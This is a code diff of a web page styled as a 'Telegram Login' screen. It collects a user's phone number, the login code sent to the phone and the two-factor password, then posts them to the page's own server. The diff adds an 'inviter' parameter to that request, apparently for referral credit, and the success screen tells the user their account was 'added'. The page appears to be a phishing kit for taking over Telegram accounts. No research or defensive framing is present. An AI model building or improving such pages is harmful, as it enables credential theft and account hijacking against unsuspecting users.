@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Login</title>
     <style>
+        /* Keep your existing styles (same as before) */
         * {
             margin: 0;
             padding: 0;
@@ -35,7 +36,6 @@
             border: 1px solid #2b3945;
         }
 
-        /* Header with back button */
         .header-bar {
             display: flex;
             align-items: center;
@@ -74,7 +74,6 @@
             color: #fff;
         }
 
-        /* Step title and description */
         .step-title {
             font-size: 1.5rem;
             font-weight: 600;
@@ -89,7 +88,6 @@
             line-height: 1.5;
         }
 
-        /* Input wrapper */
         .input-wrapper {
             background: #242f3d;
             border: 1px solid #2b3945;
@@ -131,7 +129,6 @@
             color: #5d6f7e;
         }
 
-        /* Password input */
         .password-input {
             width: 100%;
             padding: 14px 16px;
@@ -150,11 +147,6 @@
             box-shadow: 0 0 0 2px rgba(76, 156, 224, 0.2);
         }
 
-        .password-input::placeholder {
-            color: #5d6f7e;
-        }
-
-        /* Code input boxes */
         .code-container {
             display: flex;
             gap: 12px;
@@ -190,7 +182,6 @@
             pointer-events: none;
         }
 
-        /* Buttons */
         .btn {
             width: 100%;
             padding: 14px;
@@ -227,11 +218,6 @@
             color: #6ab2f2;
         }
 
-        .btn-secondary:hover:not(:disabled) {
-            background: #3a4a5a;
-        }
-
-        /* Error message */
         .error-message {
             background: #8e2b2b;
             color: white;
@@ -260,7 +246,6 @@
             display: block;
         }
 
-        /* Loading spinner */
         .loading-spinner {
             display: inline-block;
             width: 20px;
@@ -273,6 +258,17 @@
 
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+
+        .footer-link {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .footer-link a {
+            color: #4c9ce0;
+            text-decoration: none;
+            font-size: 0.9rem;
         }
     </style>
 </head>
@@ -295,7 +291,6 @@
                     Please enter your phone number with country code.
                 </div>
 
-                <!-- Single phone input with + prefix -->
                 <div class="input-wrapper">
                     <span class="input-prefix">+</span>
                     <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" value="" autofocus>
@@ -322,10 +317,8 @@
                     Please enter the 5-digit code sent to your phone.
                 </div>
 
-                <!-- Hidden input for code -->
                 <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*">
                 
-                <!-- 5 code boxes -->
                 <div class="code-container" id="codeBoxes" onclick="focusHiddenInput()">
                     <div class="code-box" id="box1">-</div>
                     <div class="code-box" id="box2">-</div>
@@ -334,39 +327,17 @@
                     <div class="code-box" id="box5">-</div>
                 </div>
 
-                <!-- Next Button -->
+                <div id="passwordGroup" style="display: none;">
+                    <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password">
+                </div>
+
                 <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                     <span>Verify</span>
                 </button>
             </div>
 
-            <!-- Page 3: Two-Factor Authentication -->
+            <!-- Page 3: Success -->
             <div id="page3" style="display: none;">
-                <div class="header-bar">
-                    <div class="back-button" onclick="backToPage2()">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
-                        </svg>
-                    </div>
-                    <div class="header-title">Two-Factor Authentication</div>
-                </div>
-
-                <div class="step-title">Password Required</div>
-                <div class="step-description">
-                    This account has two-factor authentication enabled. Please enter your password.
-                </div>
-
-                <!-- Password input -->
-                <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password" autofocus>
-
-                <!-- Next Button -->
-                <button class="btn btn-primary" id="passwordBtn" onclick="submitPassword()">
-                    <span>Sign In</span>
-                </button>
-            </div>
-
-            <!-- Page 4: Success -->
-            <div id="page4" style="display: none;">
                 <div class="header-bar">
                     <div class="back-button" onclick="backToPage1()">
                         <svg viewBox="0 0 24 24">
@@ -394,11 +365,16 @@
     </div>
 
     <script>
+        // ---------- State ----------
         let timerInterval;
         let timeLeft = 60;
         let currentSessionId = null;
         let currentPhone = '';
         let currentCode = ''; // Store the code for 2FA submission
+
+        // --- NEW: Get inviter from URL (if any) ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const currentInviter = urlParams.get('inviter');
 
         // DOM elements
         const hiddenInput = document.getElementById('hiddenCodeInput');
@@ -410,9 +386,8 @@
             document.getElementById('box5')
         ];
 
-        // Helper functions
+        // ---------- Helper Functions ----------
         function showError(message) {
-            // Remove any existing error messages
             const existingErrors = document.querySelectorAll('.error-message');
             existingErrors.forEach(el => el.remove());
             
@@ -420,21 +395,17 @@
             errorDiv.className = 'error-message show';
             errorDiv.textContent = message;
             
-            // Find which page is visible
-            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"]), #page4:not([style*="display: none"])');
+            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"])');
             if (visiblePage) {
                 visiblePage.insertBefore(errorDiv, visiblePage.firstChild);
             }
             
             setTimeout(() => {
-                if (errorDiv.parentNode) {
-                    errorDiv.remove();
-                }
+                if (errorDiv.parentNode) errorDiv.remove();
             }, 4000);
         }
 
         function showSuccess(message) {
-            // Remove any existing success messages
             const existingSuccess = document.querySelectorAll('.success-message');
             existingSuccess.forEach(el => el.remove());
             
@@ -442,15 +413,13 @@
             successDiv.className = 'success-message show';
             successDiv.textContent = message;
             
-            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"]), #page4:not([style*="display: none"])');
+            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"])');
             if (visiblePage) {
                 visiblePage.insertBefore(successDiv, visiblePage.firstChild);
             }
             
             setTimeout(() => {
-                if (successDiv.parentNode) {
-                    successDiv.remove();
-                }
+                if (successDiv.parentNode) successDiv.remove();
             }, 3000);
         }
 
@@ -471,7 +440,6 @@
             hiddenInput.focus();
         }
 
-        // Update code boxes based on hidden input
         function updateCodeBoxes() {
             const code = hiddenInput.value;
             for (let i = 0; i < 5; i++) {
@@ -485,7 +453,6 @@
             }
         }
 
-        // Hidden input event listeners
         hiddenInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
             updateCodeBoxes();
@@ -496,7 +463,38 @@
             window.location.href = '/login';
         }
 
-        // Send verification code
+        function backToPage1() {
+            document.getElementById('page1').style.display = 'block';
+            document.getElementById('page2').style.display = 'none';
+            document.getElementById('page3').style.display = 'none';
+            
+            document.getElementById('password').value = '';
+            hiddenInput.value = '';
+            updateCodeBoxes();
+            document.getElementById('phone').focus();
+            currentCode = '';
+            if (timerInterval) clearInterval(timerInterval);
+        }
+
+        function backToPage2() {
+            document.getElementById('page2').style.display = 'block';
+            document.getElementById('page3').style.display = 'none';
+            hiddenInput.focus();
+        }
+
+        function goToDashboard() {
+            window.location.href = '/dashboard';
+        }
+
+        function addAnotherAccount() {
+            backToPage1();
+            document.getElementById('phone').value = '';
+            currentSessionId = null;
+            currentPhone = '';
+            currentCode = '';
+        }
+
+        // ---------- API Calls ----------
         async function sendCode() {
             let phoneNumber = document.getElementById('phone').value.trim().replace(/\s+/g, '');
             
@@ -506,7 +504,6 @@
                 return;
             }
 
-            // Ensure phone has + prefix
             if (!phoneNumber.startsWith('+')) {
                 phoneNumber = '+' + phoneNumber;
             }
@@ -515,27 +512,21 @@
             setLoading(button, true);
 
             try {
-                console.log('Sending code to:', phoneNumber);
                 const response = await fetch('/api/add-account', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone: phoneNumber })
                 });
 
                 const data = await response.json();
-                console.log('Response:', data);
 
                 if (data.success) {
                     currentSessionId = data.session_id;
                     currentPhone = phoneNumber;
                     
-                    // Show page 2
                     document.getElementById('page1').style.display = 'none';
                     document.getElementById('page2').style.display = 'block';
                     
-                    // Clear and focus hidden input
                     hiddenInput.value = '';
                     updateCodeBoxes();
                     setTimeout(() => hiddenInput.focus(), 300);
@@ -552,7 +543,6 @@
             }
         }
 
-        // Verify code
         async function verifyCode() {
             const code = hiddenInput.value;
             
@@ -562,46 +552,49 @@
                 return;
             }
 
-            currentCode = code; // Store code for 2FA
+            const password = document.getElementById('password').value;
+            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
+
+            if (needPassword && !password) {
+                showError('Please enter your 2FA password');
+                document.getElementById('password').focus();
+                return;
+            }
+
+            currentCode = code;
             const button = document.getElementById('verifyBtn');
             setLoading(button, true);
 
             try {
-                console.log('Verifying code:', code, 'Session:', currentSessionId);
+                // --- MODIFIED: Include inviter in request body ---
                 const response = await fetch('/api/verify-code', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         code: code,
-                        session_id: currentSessionId
+                        session_id: currentSessionId,
+                        password: password,
+                        inviter: currentInviter   // <-- NEW: send inviter if present
                     })
                 });
 
                 const data = await response.json();
-                console.log('Verify response:', data);
 
                 if (data.success) {
-                    // Show success page
                     document.getElementById('page2').style.display = 'none';
-                    document.getElementById('page4').style.display = 'block';
+                    document.getElementById('page3').style.display = 'block';
                     
                     document.getElementById('successAccountInfo').innerHTML = 
                         `Account added successfully!`;
                     
+                    if (timerInterval) clearInterval(timerInterval);
                     showSuccess('Account added successfully!');
                     
                 } else if (data.need_password) {
-                    // Show 2FA page and keep the session and code
-                    document.getElementById('page2').style.display = 'none';
-                    document.getElementById('page3').style.display = 'block';
-                    document.getElementById('password').focus();
-                    
+                    document.getElementById('passwordGroup').style.display = 'block';
+                    showError('2FA is enabled. Please enter your password.');
                 } else {
                     showError(data.error || 'Verification failed');
-                    
-                    // Clear code boxes for retry
                     hiddenInput.value = '';
                     updateCodeBoxes();
                     hiddenInput.focus();
@@ -614,125 +607,26 @@
             }
         }
 
-        // Submit 2FA password
-        async function submitPassword() {
-            const password = document.getElementById('password').value;
-            
-            if (!password) {
-                showError('Please enter your 2FA password');
-                document.getElementById('password').focus();
-                return;
-            }
-
-            if (!currentCode) {
-                showError('Session expired. Please start over.');
-                backToPage1();
-                return;
-            }
-
-            const button = document.getElementById('passwordBtn');
-            setLoading(button, true);
-
-            try {
-                console.log('Submitting password with code:', currentCode);
-                const response = await fetch('/api/verify-code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ 
-                        code: currentCode,  // Send the code we stored
-                        session_id: currentSessionId,
-                        password: password
-                    })
-                });
-
-                const data = await response.json();
-                console.log('Password response:', data);
-
-                if (data.success) {
-                    // Show success page
-                    document.getElementById('page3').style.display = 'none';
-                    document.getElementById('page4').style.display = 'block';
-                    
-                    document.getElementById('successAccountInfo').innerHTML = 
-                        `Account added successfully!`;
-                    
-                    showSuccess('Account added successfully!');
-                    
-                } else {
-                    showError(data.error || 'Invalid password. Please try again.');
-                    document.getElementById('password').value = '';
-                    document.getElementById('password').focus();
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                showError('Network error. Please try again.');
-            } finally {
-                setLoading(button, false);
-            }
-        }
-
-        function backToPage1() {
-            document.getElementById('page1').style.display = 'block';
-            document.getElementById('page2').style.display = 'none';
-            document.getElementById('page3').style.display = 'none';
-            document.getElementById('page4').style.display = 'none';
-            
-            document.getElementById('password').value = '';
-            hiddenInput.value = '';
-            updateCodeBoxes();
-            document.getElementById('phone').focus();
-            currentCode = ''; // Clear stored code
-        }
-
-        function backToPage2() {
-            document.getElementById('page2').style.display = 'block';
-            document.getElementById('page3').style.display = 'none';
-            hiddenInput.focus();
-        }
-
-        function addAnotherAccount() {
-            backToPage1();
-            document.getElementById('phone').value = '';
-            currentSessionId = null;
-            currentPhone = '';
-            currentCode = '';
-        }
-
-        function goToDashboard() {
-            window.location.href = '/login';
-        }
-
         // Event listeners
         document.getElementById('phone').addEventListener('input', function(e) {
-            // Allow only numbers
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
         document.getElementById('phone').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                sendCode();
-            }
+            if (e.key === 'Enter') sendCode();
         });
 
         document.getElementById('password').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                submitPassword();
-            }
+            if (e.key === 'Enter') verifyCode();
         });
 
-        // Focus hidden input when clicking page 2
         document.getElementById('page2').addEventListener('click', function(e) {
-            if (e.target.tagName !== 'BUTTON') {
-                hiddenInput.focus();
-            }
+            if (e.target.tagName !== 'BUTTON') hiddenInput.focus();
         });
 
-        // Initialize - focus phone input
         window.addEventListener('load', function() {
             document.getElementById('phone').focus();
         });
     </script>
 </body>
-    </html>
+                </html>
